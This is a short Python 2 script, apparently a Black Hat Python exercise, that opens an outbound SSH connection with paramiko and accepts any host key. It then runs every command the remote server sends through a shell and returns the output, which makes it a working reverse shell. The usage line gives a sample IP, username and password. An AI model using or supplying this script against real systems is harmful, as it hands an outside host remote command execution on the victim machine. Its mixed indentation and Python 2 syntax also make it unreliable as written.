# bhp_reverse_ssh.py

import sys
import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
        client = paramiko.SSHClient()
        # client.load_host_keys('/home/justin/.ssh/known_hosts')
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username = user, password = passwd)

        ssh_session = client.get_transport().open_session()

        if ssh_session.active:
		ssh_session.send(command)
		print(ssh_session.recv(1024)) # read banner

		while True:
			command = ssh_session.recv(1024) # get the command from the ssh Server
			try:
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			except Exception,e:
				ssh_session.send(str(e))
		client.close()

        return

def usage():
        print("Usage python bhp_reverse_ssh.py [ip] [user] [password] ClientConnected")
        print("Example python bhp_reverse_ssh.py 192.168.1.1 justin lovethepython ClientConnected")

def main():
        if not len(sys.argv) == 5:
                usage()
                sys.exit(0)

        ssh_command(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
main()
